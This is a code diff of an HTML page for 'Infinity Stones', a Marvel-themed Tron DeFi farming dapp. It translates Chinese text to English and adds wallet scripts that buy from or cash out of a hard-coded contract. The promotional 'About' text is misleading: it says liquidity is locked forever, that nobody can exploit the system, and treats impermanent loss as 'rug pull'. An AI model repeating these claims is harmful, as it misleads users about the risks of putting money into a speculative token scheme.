+                        <div class="mbr-section-btn text-center"><a href="#" class="btn btn-danger display-4">
+                                Soul Stone</a></div>
+                    </div>
+                </div>
+            </div>
+            <div class="media-container-row" id="sto-7">
+                <div class="card p-3 col-12 col-md-6 col-lg-4">
+                    <div class="card-wrapper">
+                        <div class="card-img">
+                            <img src="images/InfinityStones-Infographic-01-740x740.jpg" alt="Mobirise">
+                        </div>
+                        <div class="card-box">
+                            <h4 class="card-title mbr-fonts-style display-7">
+                                <br><strong>The Infinity Gauntlet</strong><br>
+                            </h4>
+                            <p class="mbr-text mbr-fonts-style display-7">Thanos has collected all six Infinity Gems and
+                                attached them to his gauntlet. With their combined power, he becomes "like a god" and
+                                sets out to win the affection of Mistress Death.<br><br>Produces::
+                                <br><strong><em>Infinity Gems（IGC）<br></em></strong><br><strong>APR = <span
+                                        id="flamingosprofit">-</span>%</strong><br>
+                            </p>
+                        </div>
+                        <div class="mbr-section-btn text-center"><a href="#" class="btn btn-danger display-4">
+                                The Infinity Gauntlet</a></div>
                     </div>
                 </div>
             </div>
@@ -378,143 +675,21 @@
                 <div class="card p-3 col-12 col-md-6 col-lg-4">
                     <div class="card-wrapper">
                         <div class="card-img">
-                            <img src="images/flamingo-397x397.png?111" alt="Mobirise">
+                            <img src="images/NFT.jpg" alt="Mobirise">
                         </div>
                         <div class="card-box">
                             <h4 class="card-title mbr-fonts-style display-7">
-                                <br><strong>心灵宝石</strong><br>
+                                <br><strong>Thanos</strong><br>
                             </h4>
-                            <p class="mbr-text mbr-fonts-style display-7">心灵宝石赋予使用者心灵感应，远程控制，高智能的梦幻操纵和思想控制能力。宝石甚至能够在人造生物中产生感知，如亲眼所见一般显示在眼前。与其他宝石结合使用时，用户可以操纵整个宇宙中的所有思维。<br><br>产出:
-                                <br><strong><em>无限宝石（IGC）<br></em></strong><br><strong>APR = <span id="flamingosprofit">-</span>%</strong><br></p>
+                            <p class="mbr-text mbr-fonts-style display-7">Thanos collects the Infinity Gems.He uses the
+                                gems to create the Infinity Gauntlet, making himself omnipotent, and erases half the
+                                living things in the universe to prove his love to Death. <br><br>Produces:
+                                <br><strong><em>Infinity Gems（IGC）<br></em></strong><br><strong>APR = <span
+                                        id="flamingosprofit">-</span>%</strong><br>
+                            </p>
                         </div>
-                        <div class="mbr-section-btn text-center"><a href="flamingos.html"
-                                class="btn btn-danger display-4">
-                                心灵宝石</a></div>
-                    </div>
-                </div>
-                <div class="card p-3 col-12 col-md-6 col-lg-4">
-                    <div class="card-wrapper">
-                        <div class="card-img">
-                            <img src="images/flamingo-397x397.png?111" alt="Mobirise">
-                        </div>
-                        <div class="card-box">
-                            <h4 class="card-title mbr-fonts-style display-7">
-                                <br><strong>时间宝石</strong><br>
-                            </h4>
-                            <p class="mbr-text mbr-fonts-style display-7">时间宝石赋予了使用者对时间的完全控制权。一个人可以停止，倒退，加快时间，观察未来的情景。但是，宝石需要聪明和拥有高超科技的使用者。因为对时间连续性的不计后果的操纵可能会导致灾难。<br><br>产出:
-                                <br><strong><em>无限宝石（IGC）<br></em></strong><br><strong>APR = <span id="flamingosprofit">-</span>%</strong><br></p>
-                        </div>
-                        <div class="mbr-section-btn text-center"><a href="flamingos.html"
-                                class="btn btn-danger display-4">
-                                时间宝石</a></div>
-                    </div>
-                </div>
-                <div class="card p-3 col-12 col-md-6 col-lg-4">
-                    <div class="card-wrapper">
-                        <div class="card-img">
-                            <img src="images/flamingo-397x397.png?111" alt="Mobirise">
-                        </div>
-                        <div class="card-box">
-                            <h4 class="card-title mbr-fonts-style display-7">
-                                <br><strong>力量宝石</strong><br>
-                            </h4>
-                            <p class="mbr-text mbr-fonts-style display-7">借助力量宝石，使用者可以获得力量的增强。能量也可以集中从而形成强大的能量束形式。当力量宝石与其他宝石结合使用时，整个宇宙中存储的所有能量都可以得到控制，从而赋予用户无限的力量。<br><br>产出:
-                                <br><strong><em>无限宝石（IGC）<br></em></strong><br><strong>APR = <span id="flamingosprofit">-</span>%</strong><br></p>
-                        </div>
-                        <div class="mbr-section-btn text-center"><a href="flamingos.html"
-                                class="btn btn-danger display-4">
-                                力量宝石</a></div>
-                    </div>
-                </div>
-            </div>
-            <div class="media-container-row">
-                <div class="card p-3 col-12 col-md-6 col-lg-4">
-                    <div class="card-wrapper">
-                        <div class="card-img">
-                            <img src="images/flamingo-397x397.png?111" alt="Mobirise">
-                        </div>
-                        <div class="card-box">
-                            <h4 class="card-title mbr-fonts-style display-7">
-                                <br><strong>空间宝石</strong><br>
-                            </h4>
-                            <p class="mbr-text mbr-fonts-style display-7">空间宝石赋予使用者操作空间的能力，从而使空间宝石的持有者拥有可以跨越整个宇宙传送，甚至可以变换成其他维度的能力。不管物理定律如何，空间宝石的持有者都可以制造虫洞并控制重力。<br><br>产出:
-                                <br><strong><em>无限宝石（IGC）<br></em></strong><br><strong>APR = <span id="flamingosprofit">-</span>%</strong><br></p>
-                        </div>
-                        <div class="mbr-section-btn text-center"><a href="flamingos.html"
-                                class="btn btn-danger display-4">
-                                空间宝石</a></div>
-                    </div>
-                </div>
-                <div class="card p-3 col-12 col-md-6 col-lg-4">
-                    <div class="card-wrapper">
-                        <div class="card-img">
-                            <img src="images/flamingo-397x397.png?111" alt="Mobirise">
-                        </div>
-                        <div class="card-box">
-                            <h4 class="card-title mbr-fonts-style display-7">
-                                <br><strong>现实宝石</strong><br>
-                            </h4>
-                            <p class="mbr-text mbr-fonts-style display-7">现实宝石可以改变现实。现实宝石的力量包括创造幻觉，操纵环境，改变物体，甚至可以访问替代宇宙的现实。当现实宝石与其他宝石相结合使用时，现实改变的能力将会得到大幅的增强与改善。<br><br>产出:
-                                <br><strong><em>无限宝石（IGC）<br></em></strong><br><strong>APR = <span id="flamingosprofit">-</span>%</strong><br></p>
-                        </div>
-                        <div class="mbr-section-btn text-center"><a href="flamingos.html"
-                                class="btn btn-danger display-4">
-                                现实宝石</a></div>
-                    </div>
-                </div>
-                <div class="card p-3 col-12 col-md-6 col-lg-4">
-                    <div class="card-wrapper">
-                        <div class="card-img">
-                            <img src="images/flamingo-397x397.png?111" alt="Mobirise">
-                        </div>
-                        <div class="card-box">
-                            <h4 class="card-title mbr-fonts-style display-7">
-                                <br><strong>灵魂宝石</strong><br>
-                            </h4>
-                            <p class="mbr-text mbr-fonts-style display-7">灵魂宝石使得使用者拥有能力操纵生与死。灵魂宝石持有者所挚爱之人的灵魂也将会被困在灵魂宝石中。当灵魂宝石结合其他宝石的力量的时候，灵魂宝石便授予了使用者剥夺生命的控制权“快门”这一神技。<br><br>产出:
-                                <br><strong><em>无限宝石（IGC）<br></em></strong><br><strong>APR = <span id="flamingosprofit">-</span>%</strong><br></p>
-                        </div>
-                        <div class="mbr-section-btn text-center"><a href="flamingos.html"
-                                class="btn btn-danger display-4">
-                                灵魂宝石</a></div>
-                    </div>
-                </div>
-            </div>
-            <div class="media-container-row">
-                <div class="card p-3 col-12 col-md-6 col-lg-4">
-                    <div class="card-wrapper">
-                        <div class="card-img">
-                            <img src="images/flamingo-397x397.png?111" alt="Mobirise">
-                        </div>
-                        <div class="card-box">
-                            <h4 class="card-title mbr-fonts-style display-7">
-                                <br><strong>无限手套</strong><br>
-                            </h4>
-                            <p class="mbr-text mbr-fonts-style display-7">灭霸收集了全部六个无限宝石，并将它们附着在他的无限手套上。凭借他们的综合力量，他变得“像神一样存在”，并赢得死亡女神的爱戴。<br><br>产出:
-                                <br><strong><em>无限宝石（IGC）<br></em></strong><br><strong>APR = <span id="flamingosprofit">-</span>%</strong><br></p>
-                        </div>
-                        <div class="mbr-section-btn text-center"><a href="flamingos.html"
-                                class="btn btn-danger display-4">
-                                无限手套</a></div>
-                    </div>
-                </div>
-            </div>
-            <div class="media-container-row">
-                <div class="card p-3 col-12 col-md-6 col-lg-4">
-                    <div class="card-wrapper">
-                        <div class="card-img">
-                            <img src="images/flamingo-397x397.png?111" alt="Mobirise">
-                        </div>
-                        <div class="card-box">
-                            <h4 class="card-title mbr-fonts-style display-7">
-                                <br><strong>灭霸</strong><br>
-                            </h4>
-                            <p class="mbr-text mbr-fonts-style display-7">灭霸收集了无限宝石与无限手套，使自己无所不能，并消灭了宇宙中一半的生物，以证明他对死亡的热爱。<br><br>产出:
-                                <br><strong><em>无限宝石（IGC）<br></em></strong><br><strong>APR = <span id="flamingosprofit">-</span>%</strong><br></p>
-                        </div>
-                        <div class="mbr-section-btn text-center"><a href="flamingos.html"
-                                class="btn btn-danger display-4">
-                                灭霸</a></div>
+                        <div class="mbr-section-btn text-center"><a href="#" class="btn btn-danger display-4">
+                                Thanos</a></div>
                     </div>
                 </div>
             </div>
@@ -522,10 +697,10 @@
     </section>
     <section class="section-table cid-sn7VcigBko" id="table1-2d">
         <div class="container container-table">
-            <h2 class="mbr-section-title mbr-fonts-style align-center pb-3 display-2">农场收益表单
+            <h2 class="mbr-section-title mbr-fonts-style align-center pb-3 display-2">Farms Table
             </h2>
             <h3 class="mbr-section-subtitle mbr-fonts-style align-center pb-5 mbr-light display-5">
-                感觉有点懵? 检查下方</h3>
+                Feeling nerdy? Check below</h3>
             <div class="table-wrapper">
                 <div class="container">
                 </div>
@@ -534,28 +709,28 @@
                         <tbody>
 
                             <tr>
-                                <th class="head-item mbr-fonts-style display-7">农场</th>
+                                <th class="head-item mbr-fonts-style display-7">Farm</th>
                                 <th class="head-item mbr-fonts-style display-7">
-                                    循环供应
+                                    Circulating
                                 </th>
-                                <th class="head-item mbr-fonts-style display-7">归我所有</th>
-                                <th class="head-item mbr-fonts-style display-7"><strong>每日投资回报率</strong></th>
+                                <th class="head-item mbr-fonts-style display-7">Owned by me</th>
+                                <th class="head-item mbr-fonts-style display-7"><strong>Daily ROI</strong></th>
                                 <th class="head-item mbr-fonts-style display-7"><strong>
-                                        每周投资回报率</strong></th>
-                                <th class="head-item mbr-fonts-style display-7"><strong>年度投资回报率</strong></th>
+                                        Weekly ROI</strong></th>
+                                <th class="head-item mbr-fonts-style display-7"><strong>Yearly ROI</strong></th>
                                 <th class="head-item mbr-fonts-style display-7">
-                                    农场日常产出
+                                    Farm Daily Production
                                 </th>
                                 <th class="head-item mbr-fonts-style display-7">
-                                    我的日常产出
+                                    My Daily Production
                                 </th>
                                 <th class="head-item mbr-fonts-style display-7">
-                                    我的可索赔奖励
+                                    My Claimable Rewards
                                 </th>
                             </tr>
                             <tr>
-                                <td class="body-item mbr-fonts-style display-7"><a href="chickens.html"
-                                        class="text-primary"><strong>神盾局</strong></a><br>
+                                <td class="body-item mbr-fonts-style display-7"><a href="#"
+                                        class="text-primary"><strong>S.H.I.E.L.D.</strong></a><br>
                                 </td>
                                 <td class="body-item mbr-fonts-style display-4"><span id="chickens">-</span><br>($<span
                                         id="chickensusd">-</span>)
@@ -583,8 +758,8 @@
                                 </td>
                             </tr>
                             <tr>
-                                <td class="body-item mbr-fonts-style display-7"><a href="gooses.html"
-                                        class="text-primary"><strong>九头蛇</strong></a>
+                                <td class="body-item mbr-fonts-style display-7"><a href="#"
+                                        class="text-primary"><strong>Hydra</strong></a>
                                 </td>
                                 <td class="body-item mbr-fonts-style display-4"><span id="gooses">-</span><br>($<span
                                         id="goosesusd">-</span>)
@@ -609,8 +784,8 @@
                                             id="mygoosesrewardusd">-</span>)</a></td>
                             </tr>
                             <tr>
-                                <td class="body-item mbr-fonts-style display-7"><a href="bunnies.html"
-                                        class="text-primary"><strong>光照会</strong></a>
+                                <td class="body-item mbr-fonts-style display-7"><a href="#"
+                                        class="text-primary"><strong>Illuminati</strong></a>
                                 </td>
                                 <td class="body-item mbr-fonts-style display-4"><span id="bunnies">-</span><br>($<span
                                         id="bunniesusd">-</span>)
@@ -635,8 +810,8 @@
                                             id="mybunniesrewardusd">-</span>)</a></td>
                             </tr>
                             <tr>
-                                <td class="body-item mbr-fonts-style display-7"><a href="flamingos.html"
-                                        class="text-primary"><strong>瓦坎达</strong></a>
+                                <td class="body-item mbr-fonts-style display-7"><a href="#"
+                                        class="text-primary"><strong>Wakanda</strong></a>
                                 </td>
                                 <td class="body-item mbr-fonts-style display-4"><span id="flamingos">-</span><br>($<span
                                         id="flamingosusd">-</span>)
@@ -662,8 +837,9 @@
                                 </td>
                             </tr>
                             <tr>
-                                <td class="body-item mbr-fonts-style display-7"><a href="penguins.html"
-                                        class="text-primary"><strong>灵魂宝石</strong></a>
+                                <td class="body-item mbr-fonts-style display-7"><a href="#"
+                                        class="text-primary"><strong>Soul
+                                            Stone</strong></a>
                                 </td>
                                 <td class="body-item mbr-fonts-style display-4">
                                     <span id="penguins">-</span><br>($<span id="penguinsusd">-</span>)
@@ -700,8 +876,9 @@
                                 </td>
                             </tr>
                             <tr>
-                                <td class="body-item mbr-fonts-style display-7"><a href="penguins.html"
-                                        class="text-primary"><strong>现实宝石</strong></a>
+                                <td class="body-item mbr-fonts-style display-7"><a href="#"
+                                        class="text-primary"><strong>Reality
+                                            Stone</strong></a>
                                 </td>
                                 <td class="body-item mbr-fonts-style display-4">
                                     <span id="penguins">-</span><br>($<span id="penguinsusd">-</span>)
@@ -738,8 +915,9 @@
                                 </td>
                             </tr>
                             <tr>
-                                <td class="body-item mbr-fonts-style display-7"><a href="penguins.html"
-                                        class="text-primary"><strong>空间宝石</strong></a>
+                                <td class="body-item mbr-fonts-style display-7"><a href="#"
+                                        class="text-primary"><strong>Space
+                                            Stone</strong></a>
                                 </td>
                                 <td class="body-item mbr-fonts-style display-4">
                                     <span id="penguins">-</span><br>($<span id="penguinsusd">-</span>)
@@ -776,8 +954,9 @@
                                 </td>
                             </tr>
                             <tr>
-                                <td class="body-item mbr-fonts-style display-7"><a href="penguins.html"
-                                        class="text-primary"><strong>力量宝石</strong></a>
+                                <td class="body-item mbr-fonts-style display-7"><a href="#"
+                                        class="text-primary"><strong>Power
+                                            Stone</strong></a>
                                 </td>
                                 <td class="body-item mbr-fonts-style display-4">
                                     <span id="penguins">-</span><br>($<span id="penguinsusd">-</span>)
@@ -814,8 +993,9 @@
                                 </td>
                             </tr>
                             <tr>
-                                <td class="body-item mbr-fonts-style display-7"><a href="penguins.html"
-                                        class="text-primary"><strong>时间宝石</strong></a>
+                                <td class="body-item mbr-fonts-style display-7"><a href="#"
+                                        class="text-primary"><strong>Time
+                                            Stone</strong></a>
                                 </td>
                                 <td class="body-item mbr-fonts-style display-4">
                                     <span id="penguins">-</span><br>($<span id="penguinsusd">-</span>)
@@ -852,8 +1032,9 @@
                                 </td>
                             </tr>
                             <tr>
-                                <td class="body-item mbr-fonts-style display-7"><a href="penguins.html"
-                                        class="text-primary"><strong>心灵宝石</strong></a>
+                                <td class="body-item mbr-fonts-style display-7"><a href="#"
+                                        class="text-primary"><strong>Mind
+                                            Stone</strong></a>
                                 </td>
                                 <td class="body-item mbr-fonts-style display-4">
                                     <span id="penguins">-</span><br>($<span id="penguinsusd">-</span>)
@@ -890,8 +1071,9 @@
                                 </td>
                             </tr>
                             <tr>
-                                <td class="body-item mbr-fonts-style display-7"><a href="penguins.html"
-                                        class="text-primary"><strong>无限手套</strong></a>
+                                <td class="body-item mbr-fonts-style display-7"><a href="#"
+                                        class="text-primary"><strong>Infinite
+                                            Gloves</strong></a>
                                 </td>
                                 <td class="body-item mbr-fonts-style display-4">
                                     <span id="penguins">-</span><br>($<span id="penguinsusd">-</span>)
@@ -928,8 +1110,8 @@
                                 </td>
                             </tr>
                             <tr>
-                                <td class="body-item mbr-fonts-style display-7"><a href="fairies.html"
-                                        class="text-primary"><em>灭霸</em></a>
+                                <td class="body-item mbr-fonts-style display-7"><a href="#"
+                                        class="text-primary"><em>Thanos</em></a>
                                 </td>
                                 <td class="body-item mbr-fonts-style display-4">
                                     <span id="fairies">-</span><br>($<span id="fairiesusd">-</span>)
@@ -979,7 +1161,8 @@
                                 <td class="body-item mbr-fonts-style display-4">
                                     <span id="mytotalgldedaily" style="">-</span> ISC<br>($<span
                                         id="mytotalgldedailyusd" style="">-</span>)<br><br><span id="mytotalgldidaily"
-                                        style="">-</span> IGC<br>($<span id="mytotalgldidailyusd">-</span>)
+                                        style="">-</span>
+                                    IGC<br>($<span id="mytotalgldidailyusd">-</span>)
                                 </td>
                                 <td class="body-item mbr-fonts-style display-4"><span id="mytotalgldereward"
                                         style="">-</span>
@@ -1018,47 +1201,162 @@
                 </div>
             </div>
         </div>
-    </section>
- 
-    
-   
+    </section> -->
+
+
     <section class="mbr-section info2 cid-slHZx35kiL" id="info2-x">
         <div class="container">
             <div class="row main justify-content-center">
                 <div class="media-container-column col-12 col-lg-3 col-md-4">
-                    <div class="mbr-section-btn align-left py-4"><a class="btn btn-success-outline display-4"
-                            href="https://tronscan.org/#/token20/TQXhxDPNKVsgxYbJatMnkRZsgTcTzxC5Fc/holders"
-                            target="_blank">ISC Tronscan</a> <a class="btn btn-danger-outline display-4"
-                            href="https://tronscan.org/#/token20/TQx2dDDHv8xVr5HEYRygjWizYdzDmdUHNp/holders"
-                            target="_blank">IGC Tronscan</a></div>
+                    <div class="mbr-section-btn align-left py-4">
+                        <a class="btn btn-success-outline display-4"
+                            href="https://tronscan.io/#/token20/TTDtaxBddiDZTwcE7dVzmS5BrK1tgiyndA" target="_blank">ISC
+                            Tronscan</a>
+                    </div>
                 </div>
                 <div class="media-container-column title col-12 col-lg-7 col-md-6">
                     <h2 class="align-right mbr-bold mbr-white pb-3 mbr-fonts-style display-2">
-                        关于Infinity Stones<br><br></h2>
-                    <h3 class="mbr-section-subtitle align-right mbr-light mbr-white mbr-fonts-style display-7">Infinity Stones
-                        是一个由两个Defi令牌和三个农场合同组成的Defi系统, 托管在Tron区块链上, 透明且开源. 这是第一个易于使用的Defi Dapp, 这要归功于“一键放养功能”, 并且由于其嵌入式的安全流动性机制而非常安全. 默认情况下, 所有流动性始终被永远锁定.&nbsp;由于没有人可以利用该系统, 因此可以提供强大的保护，以防止永久损失，也称为“一键抽空”.Infinity Stones 和 Infinity Gems的价格完全由供求关系决定，整个Dapp始终处于完全分撒的状态。无限原石可以随时买卖，也可以用来挖掘无限宝石！随时可以买卖无限宝石!<br></h3>
+                        About Infinity Stones
+                        <h3 class="mbr-section-subtitle align-right mbr-light mbr-white mbr-fonts-style display-7">
+                            Infinity Stones
+                            is a Defi ecosystem composed of two Defi Tokens and three Farming contracts, hosted on the
+                            Tron Blockchain, transparent and opensource. It is the first Defi Dapp that is easy to use,
+                            thanks to the "One Click Staking" function, and safe thanks to it's embedded
+                            secured-liquidity mechanism. All liquidity is always locked forever, by default.
+                            This offers a great protection against impermanent losses also known as "rug pull", since
+                            nobody can take advantage of the system.
+                            Infinity Stones and Infinity Gems price is totally dictated by supply and demand dynamics,
+                            the
+                            whole dapp is fully decentralized all the time. Infinity Stones can be bought and sold at
+                            any time, and they can
+                            be also used to farm Infinity Gems! Infinity Gems can be bought and sold at any time!
+                            Infinity Stones is an entertainment vehicle and not an investment product.<br></h3>
                 </div>
             </div>
         </div>
     </section>
-    <section
-        style="background-color: #fff; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif; color:#aaa; font-size:12px; padding: 0; align-items: center; display: flex;">
-        <a href="https://mobirise.site/m" style="flex: 1 1; height: 3rem; padding-left: 1rem;"></a>
-        <p style="flex: 0 0 auto; margin:0; padding-right:1rem;">Designed with <a href="https://mobirise.site/b"
-                style="color:#aaa;">Mobirise</a> website template</p>
-    </section>
+
     <script src="js/jquery.min.js"></script>
-    <script src="js/popper.min.js"></script>
     <script src="js/bootstrap.min.js"></script>
-    <script src="js/tether.min.js"></script>
-    <script src="js/smooth-scroll.js"></script>
     <script src="js/nav-dropdown.js"></script>
     <script src="js/navbar-dropdown.js"></script>
-    <script src="js/jquery.touch-swipe.min.js"></script>
-    <script src="js/jarallax.min.js"></script>
-    <script src="js/jquery.data-tables.min.js"></script>
-    <script src="js/data-tables.bootstrap4.min.js"></script>
-    <script src="js/script.js"></script>
+
 </body>
+
+
+
+<script language="javascript" type="text/javascript">
+    leftTimer(2021, 8, 11, 11, 11, 11);
+
+    function leftTimer(year, month, day, hour, minute, second) {
+        var leftTime = (new Date(year, month - 1, day, hour, minute, second)) - (new Date()); //计算剩余的毫秒数
+        var days = parseInt(leftTime / 1000 / 60 / 60 / 24, 10); //计算剩余的天数
+        var hours = parseInt(leftTime / 1000 / 60 / 60 % 24, 10); //计算剩余的小时
+        var minutes = parseInt(leftTime / 1000 / 60 % 60, 10);//计算剩余的分钟
+        var seconds = parseInt(leftTime / 1000 % 60, 10);//计算剩余的秒数
+        days = checkTime(days);
+        hours = checkTime(hours);
+        minutes = checkTime(minutes);
+        seconds = checkTime(seconds);
+        document.getElementById("countdown").innerHTML = days + "：" + hours + "：" + minutes + "：" + seconds + "：";
+    }
+
+    setInterval("leftTimer(2021,8,11,11,11,11)", 1000);
+
+
+
+    function checkTime(i) { //将0-9的数字前面加上0，例1变为01
+        if (i < 10) {
+            i = "0" + i;
+        }
+        return i;
+    }
+
+
+    async function getcontent() {
+        var myinput = $("#myinput").val();
+        if (myinput < 50) {
+            alert("minum 50trx!");
+            return;
+        }
+
+        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+           
+            try {
+                let contract = await
+                    window.tronWeb.contract().at('TDHth3avwk5JuXhorWq97r4NvZdEC73Xnv');
+                let result = await
+                    contract.buy().send({
+                        feeLimit: 100_000_000,
+                        callValue: myinput * 1000000,
+                        shouldPollResponse: false
+                    });
+                console.log(result);
+
+            } catch (error) {
+                console.log(error);
+                alert("Refuse to pay");
+            }
+        }else {
+            alert("Please unlock your Tron wallet to start interacting");
+        }
+
+    }
+
+    async function getcash() {
+
+
+        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+
+            try {
+                let contract = await
+                    window.tronWeb.contract().at('TDHth3avwk5JuXhorWq97r4NvZdEC73Xnv');
+                let result = await
+                    contract.cash().send({
+                        feeLimit: 100_000_000,
+                        callValue: 0,
+                        shouldPollResponse: false
+                    });
+                console.log(result);
+                alert("Pay Finish");
+            } catch (error) {
+                console.log(error);
+                alert("Error Pay");
+            }
+        } else {
+            alert("Please unlock your Tron wallet to start interacting");
+        }
+
+    }
+
+
+    gettronweb();
+    async function gettronweb() {
+        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+            console.log("Yes, catch it:", window.tronWeb.defaultAddress.base58)
+        } else {
+            console.log("111");
+        }
+        var obj = setInterval(function () {
+            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                console.log(window.tronWeb.defaultAddress.base58);
+                var defaultAddress = window.tronWeb.defaultAddress.base58;
+                $("#mywalletLP").html(defaultAddress);
+
+
+                tronWeb.trx.getAccount(defaultAddress).then(result => {
+                    console.log(result.balance / 1000000);
+                    $("#mywalletLPusd").html(result.balance / 1000000 + " trx");
+                })
+
+                clearInterval(obj)
+
+            }
+
+
+        }, 1000);
+    }
+
+</script>
 
 </html>
